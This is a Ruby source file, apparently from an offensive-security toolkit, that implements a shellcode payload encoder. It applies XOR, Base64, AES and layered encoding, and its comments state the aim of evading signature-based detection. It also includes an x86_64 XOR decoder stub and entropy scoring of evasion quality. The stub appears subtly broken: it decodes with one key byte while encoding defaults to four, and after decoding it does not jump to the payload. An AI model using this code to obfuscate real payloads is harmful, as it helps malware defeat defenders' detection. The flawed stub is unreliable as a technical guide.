# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Payload Encoder
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
# DO NOT use this encoder for malicious purposes.
#
# Implements XOR, Base64, and AES encoding for shellcode payloads.
# Payload encoding is used to evade signature-based detection by
# transforming the payload so it doesn't match known patterns.
# A decoder stub is prepended to reverse the encoding at runtime.
#
# MITRE ATT&CK: T1027 - Obfuscated Files or Information
# MITRE ATT&CK: T1140 - Deobfuscate/Decode Files or Information
# =============================================================================

require 'base64'
require 'openssl'
require 'securerandom'

module RubyGuardian
  module ProcessHollowing
    module Payloads
      class Encoder
        # Encoding iteration metadata tracked per operation
        EncodingResult = Struct.new(:encoded_data, :decoder_stub, :metadata, keyword_init: true)

        attr_reader :encoding_log

        def initialize
          @encoding_log = []
        end

        # XOR-encode payload with a single-byte or multi-byte key.
        #
        # EDUCATIONAL: XOR encoding is the simplest payload transformation.
        # Every byte is XORed with the key. The same operation decodes it
        # (XOR is its own inverse). Weaknesses:
        #   - Single-byte key: trivially brute-forced (256 possibilities)
        #   - Known-plaintext: if any original byte is known, key is revealed
        #   - Statistical analysis can detect XOR patterns
        #
        # @param payload [String] Raw payload bytes
        # @param key [String, nil] XOR key (random if nil)
        # @return [EncodingResult] Encoded payload with decoder stub
        def xor_encode(payload, key: nil)
          key ||= SecureRandom.random_bytes(4)
          key_bytes = key.bytes

          encoded = payload.bytes.each_with_index.map do |byte, i|
            byte ^ key_bytes[i % key_bytes.length]
          end.pack('C*')

          # Verify encoding is reversible
          decoded_check = encoded.bytes.each_with_index.map do |byte, i|
            byte ^ key_bytes[i % key_bytes.length]
          end.pack('C*')
          raise 'XOR encoding verification failed' unless decoded_check == payload

          # Generate x86_64 XOR decoder stub (for single-byte key)
          decoder_stub = generate_xor_decoder_stub(key_bytes.first, encoded.bytesize)

          result = EncodingResult.new(
            encoded_data: encoded,
            decoder_stub: decoder_stub,
            metadata: {
              encoding: :xor,
              key_hex: key.unpack1('H*'),
              key_length: key_bytes.length,
              original_size: payload.bytesize,
              encoded_size: encoded.bytesize,
              null_free: !encoded.include?("\x00")
            }
          )

          log_encoding(:xor, payload.bytesize, encoded.bytesize)
          result
        end

        # Base64-encode payload for text-safe transport.
        #
        # EDUCATIONAL: Base64 isn't encryption -- it's encoding for transport.
        # It expands the payload by ~33% but ensures all bytes are printable
        # ASCII. Useful for embedding payloads in scripts, config files, or
        # environment variables. Must be decoded before execution.
        #
        # @param payload [String] Raw payload bytes
        # @param strict [Boolean] Use strict (no newlines) encoding
        # @return [EncodingResult] Base64-encoded payload
        def base64_encode(payload, strict: true)
          encoded = strict ? Base64.strict_encode64(payload) : Base64.encode64(payload)

          result = EncodingResult.new(
            encoded_data: encoded,
            decoder_stub: generate_base64_decoder_ruby,
            metadata: {
              encoding: :base64,
              strict: strict,
              original_size: payload.bytesize,
              encoded_size: encoded.bytesize,
              expansion_ratio: (encoded.bytesize.to_f / payload.bytesize).round(3),
              printable: true
            }
          )

          log_encoding(:base64, payload.bytesize, encoded.bytesize)
          result
        end

        # AES-256-CBC encrypt payload with key derivation.
        #
        # EDUCATIONAL: AES encryption provides strong payload protection.
        # Unlike XOR, it cannot be trivially reversed without the key.
        # In real malware, the decryption key is often:
        #   - Hardcoded (poor OPSEC but simple)
        #   - Derived from environment (hostname, MAC, etc.)
        #   - Fetched from a C2 server (requires network)
        #   - Split across multiple locations (key splitting)
        #
        # @param payload [String] Raw payload bytes
        # @param password [String, nil] Encryption password (random if nil)
        # @return [EncodingResult] AES-encrypted payload with IV
        def aes_encrypt(payload, password: nil)
          password ||= SecureRandom.hex(16)

          cipher = OpenSSL::Cipher::AES256.new(:CBC)
          cipher.encrypt

          # Derive key and IV from password using PBKDF2
          salt = SecureRandom.random_bytes(16)
          key = OpenSSL::PKCS5.pbkdf2_hmac(
            password, salt, 10_000, 32, OpenSSL::Digest::SHA256.new
          )
          iv = cipher.random_iv

          cipher.key = key
          cipher.iv = iv

          encrypted = cipher.update(payload) + cipher.final

          # Verify decryption works
          verify_aes_decryption(encrypted, key, iv, payload)

          # Package: salt(16) + iv(16) + encrypted_data
          packaged = salt + iv + encrypted

          result = EncodingResult.new(
            encoded_data: packaged,
            decoder_stub: generate_aes_decoder_ruby(password),
            metadata: {
              encoding: :aes256_cbc,
              password_hint: "#{password[0..3]}...#{password[-4..]}",
              salt_hex: salt.unpack1('H*'),
              iv_hex: iv.unpack1('H*'),
              original_size: payload.bytesize,
              encrypted_size: encrypted.bytesize,
              packaged_size: packaged.bytesize,
              key_derivation: 'PBKDF2-HMAC-SHA256',
              iterations: 10_000
            }
          )

          log_encoding(:aes256_cbc, payload.bytesize, packaged.bytesize)
          result
        end

        # Apply multiple encoding layers (onion encoding).
        #
        # EDUCATIONAL: Layered encoding makes analysis harder because each
        # layer must be peeled off in the correct order. However, each layer
        # adds size overhead and decoder complexity.
        #
        # @param payload [String] Raw payload bytes
        # @param layers [Array<Symbol>] Encoding layers to apply in order
        # @return [EncodingResult] Multi-layer encoded payload
        def multi_layer_encode(payload, layers: %i[xor base64 xor])
          current_data = payload
          layer_metadata = []

          layers.each_with_index do |layer, idx|
            result = case layer
                     when :xor    then xor_encode(current_data)
                     when :base64 then base64_encode(current_data)
                     when :aes    then aes_encrypt(current_data)
                     else raise "Unknown encoding layer: #{layer}"
                     end

            current_data = result.encoded_data
            layer_metadata << { layer: idx, encoding: layer, size: current_data.bytesize }
          end

          EncodingResult.new(
            encoded_data: current_data,
            decoder_stub: "# Multi-layer decoder: reverse #{layers.reverse.inspect}",
            metadata: {
              encoding: :multi_layer,
              layers: layer_metadata,
              original_size: payload.bytesize,
              final_size: current_data.bytesize
            }
          )
        end

        # Analyze encoding entropy to assess detection evasion quality.
        #
        # @param data [String] Encoded data
        # @return [Hash] Entropy analysis
        def analyze_entropy(data)
          byte_freq = Array.new(256, 0)
          data.each_byte { |b| byte_freq[b] += 1 }

          total = data.bytesize.to_f
          entropy = byte_freq.reject(&:zero?).sum do |count|
            prob = count / total
            -prob * Math.log2(prob)
          end

          {
            entropy: entropy.round(4),
            max_entropy: 8.0,
            ratio: (entropy / 8.0).round(4),
            assessment: entropy > 7.5 ? :high_randomness : entropy > 6.0 ? :moderate : :low,
            unique_bytes: byte_freq.count(&:positive?),
            null_bytes: byte_freq[0],
            printable_ratio: data.bytes.count { |b| b.between?(0x20, 0x7E) } / total
          }
        end

        # Report of all encoding operations performed.
        def encoding_report
          {
            total_operations: @encoding_log.length,
            operations: @encoding_log
          }
        end

        private

        # Generate an x86_64 XOR decoder stub.
        #
        # EDUCATIONAL: The decoder stub is position-independent shellcode that
        # XOR-decodes the following payload in-place, then falls through to it.
        def generate_xor_decoder_stub(key_byte, payload_length)
          stub = []
          # jmp short to call (get RIP)
          stub += [0xEB, 0x0E]
          # pop rsi (address of encoded payload)
          stub += [0x5E]
          # xor rcx, rcx
          stub += [0x48, 0x31, 0xC9]
          # mov cl, payload_length
          stub += [0xB1, payload_length & 0xFF]
          # decode_loop: xor byte [rsi], key
          stub += [0x80, 0x36, key_byte]
          # inc rsi
          stub += [0x48, 0xFF, 0xC6]
          # loop decode_loop (dec rcx, jnz)
          stub += [0xE2, 0xF8]
          # call (pushes address of encoded payload)
          stub += [0xE8, 0xED, 0xFF, 0xFF, 0xFF]

          stub.pack('C*')
        end

        # Generate a Ruby-based Base64 decoder snippet.
        def generate_base64_decoder_ruby
          <<~RUBY
            require 'base64'
            decoded = Base64.strict_decode64(encoded_payload)
          RUBY
        end

        # Generate a Ruby-based AES decoder snippet.
        def generate_aes_decoder_ruby(password)
          <<~RUBY
            require 'openssl'
            salt = packaged[0, 16]
            iv = packaged[16, 16]
            data = packaged[32..]
            key = OpenSSL::PKCS5.pbkdf2_hmac("#{password}", salt, 10000, 32, OpenSSL::Digest::SHA256.new)
            cipher = OpenSSL::Cipher::AES256.new(:CBC)
            cipher.decrypt
            cipher.key = key
            cipher.iv = iv
            payload = cipher.update(data) + cipher.final
          RUBY
        end

        # Verify AES decryption produces the original payload.
        def verify_aes_decryption(encrypted, key, iv, original)
          decipher = OpenSSL::Cipher::AES256.new(:CBC)
          decipher.decrypt
          decipher.key = key
          decipher.iv = iv
          decrypted = decipher.update(encrypted) + decipher.final

          unless decrypted == original
            raise 'AES encryption verification failed: decrypted data does not match original'
          end
        end

        def log_encoding(type, original_size, encoded_size)
          @encoding_log << {
            timestamp: Time.now.utc.iso8601,
            encoding: type,
            original_size: original_size,
            encoded_size: encoded_size,
            ratio: (encoded_size.to_f / original_size).round(3)
          }
        end
      end
    end
  end
end
